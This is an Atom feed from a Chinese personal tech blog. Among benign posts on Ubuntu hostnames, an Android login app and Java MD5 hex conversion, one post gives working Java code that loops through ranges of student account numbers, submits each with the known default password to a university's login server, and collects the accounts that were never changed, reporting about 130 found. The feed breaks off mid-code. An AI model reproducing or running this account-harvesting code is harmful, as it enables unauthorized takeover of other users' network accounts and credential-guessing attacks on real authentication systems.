<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[TopJohn'Blog]]></title>
  <subtitle><![CDATA[Coding的路上，至少我乐在其中...]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.xuanzhangjiong.xyz/"/>
  <updated>2016-01-22T07:11:38.000Z</updated>
  <id>http://www.xuanzhangjiong.xyz/</id>
  
  <author>
    <name><![CDATA[John]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Ubuntu修改hostname]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2016/01/22/Ubuntu%E4%BF%AE%E6%94%B9hostname/"/>
    <id>http://www.xuanzhangjiong.xyz/2016/01/22/Ubuntu修改hostname/</id>
    <published>2016-01-22T06:44:21.000Z</published>
    <updated>2016-01-22T07:11:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="u67E5_u770B_u4E3B_u673A_u540D"><a href="#u67E5_u770B_u4E3B_u673A_u540D" class="headerlink" title="查看主机名"></a>查看主机名</h1><p>终端中输入<code>hostname</code>，即可看到自己的hostname。</p>
<h1 id="u4E34_u65F6_u4FEE_u6539_u4E3B_u673A_u540D"><a href="#u4E34_u65F6_u4FEE_u6539_u4E3B_u673A_u540D" class="headerlink" title="临时修改主机名"></a>临时修改主机名</h1><p>在终端中输入：<code>hostname &lt;new name&gt;</code>，重新开一个终端就可以看到新的hostname了，但是重启后就变回原样了。</p>
<h1 id="u6C38_u4E45_u4FEE_u6539_u4E3B_u673A_u540D"><a href="#u6C38_u4E45_u4FEE_u6539_u4E3B_u673A_u540D" class="headerlink" title="永久修改主机名"></a>永久修改主机名</h1><p>打开终端，直接<code>vim /etc/hostname</code>，直接改了然后重启系统就ok了。</p>
]]></content>
    <summary type="html">
    <![CDATA[每次ssh 到阿里云的ecs实例名都是一长串，查了查资料，终于改了它]]>
    
    </summary>
    
      <category term="小技巧" scheme="http://www.xuanzhangjiong.xyz/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
      <category term="ubuntu" scheme="http://www.xuanzhangjiong.xyz/categories/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[软院上网助手Android版]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2016/01/08/%E8%BD%AF%E9%99%A2%E4%B8%8A%E7%BD%91%E5%8A%A9%E6%89%8BAndroid%E7%89%88/"/>
    <id>http://www.xuanzhangjiong.xyz/2016/01/08/软院上网助手Android版/</id>
    <published>2016-01-08T05:57:41.000Z</published>
    <updated>2016-01-08T06:25:16.000Z</updated>
    <content type="html"><![CDATA[<p>其实原理没什么好说的就是上一篇blog中的，应用也只有一个页面，一个按钮，一点就登录了，一个<code>Thread</code>搞定。<br>如图：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/%E8%BD%AF%E9%99%A2%E4%B8%8A%E7%BD%91%E5%8A%A9%E6%89%8B.jpg?imageView2/2/w/360/h/640" alt=""></p>
<p>代码github地址：<br><a href="/&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#99;&#111;&#109;&#58;&#x54;&#x6f;&#x70;&#x4a;&#111;&#104;&#x6e;&#x2f;&#x4e;&#101;&#116;&#x48;&#101;&#x6c;&#112;&#x65;&#x72;&#x2e;&#103;&#105;&#116;">&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#99;&#111;&#109;&#58;&#x54;&#x6f;&#x70;&#x4a;&#111;&#104;&#x6e;&#x2f;&#x4e;&#101;&#116;&#x48;&#101;&#x6c;&#112;&#x65;&#x72;&#x2e;&#103;&#105;&#116;</a></p>
]]></content>
    <summary type="html">
    <![CDATA[继上一篇抓取校园网账号的blog，做了一个Android版的小应用，方便一个账号登着电脑，又想在手机上登录的童鞋]]>
    
    </summary>
    
      <category term="作品" scheme="http://www.xuanzhangjiong.xyz/tags/%E4%BD%9C%E5%93%81/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[抓取校园网账号－java版]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2016/01/07/%E6%8A%93%E5%8F%96%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%B4%A6%E5%8F%B7%EF%BC%8Djava%E7%89%88/"/>
    <id>http://www.xuanzhangjiong.xyz/2016/01/07/抓取校园网账号－java版/</id>
    <published>2016-01-07T06:27:05.000Z</published>
    <updated>2016-01-08T06:01:46.000Z</updated>
    <content type="html"><![CDATA[<p>前天吧，室友丁小贤童鞋，用python抓了几十个校园网的账号，当时就震惊了，以前凑过几个账号，因为某些情况下，自己一个账号并不够用，所以偶尔用用别人不用的账号也是可以的。</p>
<p>于是乎，昨天上午，上课不听课，开始研究怎么抓取账号了。</p>
<p>简单介绍下，我们学校的校园网用的是联通的网，200兆带宽吧，有个服务器作统一身份认证，连上<code>CST-WLAN</code>，就出现了登陆界面ip是<code>192.0.0.6</code></p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%911.jpg" alt=""></p>
<p>chrome里看了下源代码，我去，js什么的都没有压缩，阅读起来流畅的很，主要接口大概给了3个：</p>
<ul>
<li><p>登陆接口</p>
<p>看下主要代码：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">var data=<span class="string">"username="</span>+uname+<span class="string">"&amp;password="</span>+pass2+<span class="string">"&amp;drop="</span>+drop+<span class="string">"&amp;type=1&amp;n=100"</span>;</span><br><span class="line"></span><br><span class="line">  var con=postData(<span class="string">"/cgi-bin/do_login"</span>, <span class="string">"post"</span>, data);</span><br><span class="line">  <span class="comment">//alert(con);</span></span><br><span class="line">  var p=/^[\d]+$/;</span><br><span class="line">  <span class="keyword">if</span>(p.test(con))</span><br><span class="line">  &#123;</span><br><span class="line">      document.form1.uid.value=con;</span><br><span class="line">      <span class="keyword">if</span>(document.form1.save_me.checked) <span class="comment">//写COOKIE</span></span><br><span class="line">      &#123;</span><br><span class="line">          setCookie(<span class="string">"srun_login"</span>,uname+<span class="string">"|"</span>+pass);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          delCookie(<span class="string">"srun_login"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      window.open(<span class="string">"login.html"</span>+location.search,<span class="string">"user_login"</span>,<span class="string">"width=428,height=296"</span>);         </span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">switch</span>(con)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"user_tab_error"</span>:</span><br><span class="line">          alert(<span class="string">"认证程序未启动"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"username_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户名错误"</span>);</span><br><span class="line">          document.form1.uname.focus();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"non_auth_error"</span>:</span><br><span class="line">          alert(<span class="string">"您无须认证，可直接上网"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"password_error"</span>:</span><br><span class="line">          alert(<span class="string">"密码错误"</span>);</span><br><span class="line">          document.form1.pass.focus();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"status_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户已欠费，请尽快充值。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"available_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户已禁用"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"usernum_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户数已达上限"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"online_num_error"</span>:</span><br><span class="line">          alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;    </span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"mode_error"</span>:</span><br><span class="line">          alert(<span class="string">"系统已禁止WEB方式登录，请使用客户端"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"time_policy_error"</span>:</span><br><span class="line">          alert(<span class="string">"当前时段不允许连接"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"flux_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的流量已超支"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"minutes_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的时长已超支"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"ip_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的IP地址不合法"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"mac_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的MAC地址不合法"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"sync_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的资料已修改，正在等待同步，请2分钟后再试。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          alert(<span class="string">"找不到认证服务器"</span>);</span><br><span class="line">          <span class="keyword">break</span>;        </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>给的太详细了,简单的说，将用户名和密码的md5值的16进制字符截取8-24位post到服务器，如果验证成功估计返回的是<code>UUID</code>，失败则返回各种错误值。</p>
</li>
<li><p>登出</p>
</li>
</ul>
<p>不作详细介绍，意思就是，本机登陆了，就可以登出，且登出后，无需等待，即可登录。</p>
<ol>
<li>强制登出</li>
</ol>
<p>强制登出的意思是，这个账号在别的地方登录了，那么可以强制登出，2分钟后可以登录。</p>
<p>程序思路很简单，遍历所有账号，对默认密码进行md5计算，发起<code>post</code>请求，看了下返回值，其实只有2种是成功的，对我们来说：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br></pre></td></tr></table></figure>
<p>这种是测试的这个账号并没有上线。</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"online_num_error"</span>:                       alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br></pre></td></tr></table></figure>
<p>这种是测试的账号已经登录了，但是密码并没有修改。</p>
<p>截取这2种情况的账号看看有几个，收集起来就可以了。</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="type">void</span> login() &#123;</span><br><span class="line"></span><br><span class="line">       //双证</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> i = <span class="type">DOUBLE_RANGE_START</span>; i &lt;= <span class="type">DOUBLE_RANGE_END</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">           boolean isOk = post(i + <span class="string">""</span>, <span class="type">DOUBLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isOk) &#123;</span><br><span class="line"></span><br><span class="line">               //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"ok"</span>);</span><br><span class="line"></span><br><span class="line">               <span class="literal">result</span>.put(i + <span class="string">""</span>, <span class="type">DOUBLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //单证</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> j = <span class="type">SINGLE_RANGE_START</span>; j &lt;= <span class="type">SINGLE_RANGE_END</span>; j++) &#123;</span><br><span class="line"></span><br><span class="line">           boolean isOk = post(<span class="string">"nb"</span> + j + <span class="string">""</span>, <span class="type">SINGLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isOk) &#123;</span><br><span class="line"></span><br><span class="line">               //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"ok"</span>);</span><br><span class="line"></span><br><span class="line">               <span class="literal">result</span>.put(<span class="string">"nb"</span> + j + <span class="string">""</span>, <span class="type">SINGLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> boolean post(<span class="type">String</span> userName, <span class="type">String</span> passWord) &#123;</span><br><span class="line"></span><br><span class="line">       passWord = md5_1(passWord);</span><br><span class="line"></span><br><span class="line">       // <span class="type">System</span>.<span class="keyword">out</span>.println(userName+<span class="string">":"</span>+passWord);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           url = new <span class="type">URL</span>(<span class="type">URL</span>);</span><br><span class="line">           http = (<span class="type">HttpURLConnection</span>) url.openConnection();</span><br><span class="line"></span><br><span class="line">           http.setDoInput(<span class="literal">true</span>);</span><br><span class="line">           http.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">           http.setUseCaches(<span class="literal">false</span>);</span><br><span class="line">           http.setConnectTimeout(<span class="number">50000</span>);//设置连接超时</span><br><span class="line">           http.setReadTimeout(<span class="number">50000</span>);//设置读取超时</span><br><span class="line">           http.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">           http.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">           http.connect();</span><br><span class="line">           <span class="type">String</span> param = <span class="string">"username="</span> + userName + <span class="string">"&amp;password="</span> + passWord + <span class="string">"&amp;drop="</span> + <span class="number">0</span> + <span class="string">"&amp;type=1&amp;n=100"</span>;</span><br><span class="line"></span><br><span class="line">           <span class="type">OutputStreamWriter</span> osw = new <span class="type">OutputStreamWriter</span>(http.getOutputStream(), <span class="string">"utf-8"</span>);</span><br><span class="line">           osw.write(param);</span><br><span class="line">           osw.flush();</span><br><span class="line">           osw.close();</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (http.getResponseCode() == <span class="number">200</span>) &#123;</span><br><span class="line"></span><br><span class="line">               <span class="type">BufferedReader</span> <span class="keyword">in</span> = new <span class="type">BufferedReader</span>(new <span class="type">InputStreamReader</span>(http.getInputStream(), <span class="string">"utf-8"</span>));</span><br><span class="line"></span><br><span class="line">               <span class="type">StringBuffer</span> <span class="literal">result</span> = new <span class="type">StringBuffer</span>();</span><br><span class="line">               <span class="type">String</span> temp;</span><br><span class="line">               <span class="keyword">while</span> ((temp = <span class="keyword">in</span>.readLine()) != null) &#123;</span><br><span class="line">                   <span class="literal">result</span>.append(temp);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">in</span>.close();</span><br><span class="line"></span><br><span class="line">              // <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">//                <span class="keyword">if</span> (matchs(<span class="literal">result</span>.toString())) &#123;</span><br><span class="line">//</span><br><span class="line">//                   // <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                    postLogout(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">//</span><br><span class="line">//                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">               switch (<span class="literal">result</span>.toString()) &#123;</span><br><span class="line">//                    <span class="keyword">case</span> <span class="string">"non_auth_error"</span>:</span><br><span class="line">////                        alert(<span class="string">"您无须认证，可直接上网"</span>);</span><br><span class="line">//</span><br><span class="line">//                        //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">//                        alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br><span class="line"></span><br><span class="line">                       //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">case</span> <span class="string">"online_num_error"</span>:</span><br><span class="line">//                        alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br><span class="line"></span><br><span class="line">                       //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   default:</span><br><span class="line">//                        alert(<span class="string">"找不到认证服务器"</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125; catch (<span class="type">Exception</span> e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (http != null)</span><br><span class="line">               http.disconnect();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5_1</span><span class="params">(String pass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//128位整数分成了16份每份8位</span></span><br><span class="line">       byte[] digest = md5.digest(pass.getBytes());</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//由于有符号位,所以要处理下</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i : digest) &#123;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">//二进制存的是补码</span></span><br><span class="line">               i += <span class="number">256</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">               sb.append(<span class="string">"0"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           sb.append(Integer.toHexString(i));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//取16位</span></span><br><span class="line">       <span class="keyword">return</span> sb.toString().substring(<span class="number">8</span>, <span class="number">24</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>主要代码都贴出来了，我把它放到github了<br><a href="/&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x67;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;&#58;&#84;&#x6f;&#112;&#74;&#111;&#x68;&#110;&#x2f;&#78;&#x65;&#x74;&#65;&#99;&#111;&#x75;&#x6e;&#x74;&#46;&#103;&#105;&#x74;">&#x67;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;&#58;&#84;&#x6f;&#112;&#74;&#111;&#x68;&#110;&#x2f;&#78;&#x65;&#x74;&#65;&#99;&#111;&#x75;&#x6e;&#x74;&#46;&#103;&#105;&#x74;</a></p>
<p>那么测试结果呢：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%912.jpg" alt=""><br>顶峰时刻有130个，估计我宣传了一波之后，有不少人改了。<br>一会推出Android版的。</p>
]]></content>
    <summary type="html">
    <![CDATA[最近闲的无聊，尝试着抓了下没改密码的校园网账号]]>
    
    </summary>
    
      <category term="校园网账号抓取" scheme="http://www.xuanzhangjiong.xyz/tags/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%B4%A6%E5%8F%B7%E6%8A%93%E5%8F%96/"/>
    
      <category term="java" scheme="http://www.xuanzhangjiong.xyz/categories/java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[java-MD5转HexString的3种方法]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2016/01/06/java-MD5%EF%BC%8D-HexString%E7%9A%843%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://www.xuanzhangjiong.xyz/2016/01/06/java-MD5－-HexString的3种方法/</id>
    <published>2016-01-06T06:27:59.000Z</published>
    <updated>2016-01-08T07:46:40.000Z</updated>
    <content type="html"><![CDATA[<p>之前用到java的md5，没有仔细深究，自己把自己糊弄了一下，然而并没有糊弄过去，对于强迫症用户来说，一个问题没有想明白是不可能罢手的。</p>
<p>首先来看java的md5消息摘要给我们返回的是什么：</p>
<blockquote>
<p>我实践了一下，是一个16位的<code>byte</code>数组，其实实际上是一个128位的数，数组中的每个元素占8位，一个16个，16*8正好128位，就是截取了这个大数，分成了16份。</p>
</blockquote>
<p>我在网上浏览了一些博客，发现大致的转换方法有3种：</p>
<h1 id="1-__u52A0256"><a href="#1-__u52A0256" class="headerlink" title="1. 加256"></a>1. 加256</h1><p>先看代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5_1</span><span class="params">(String pass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span 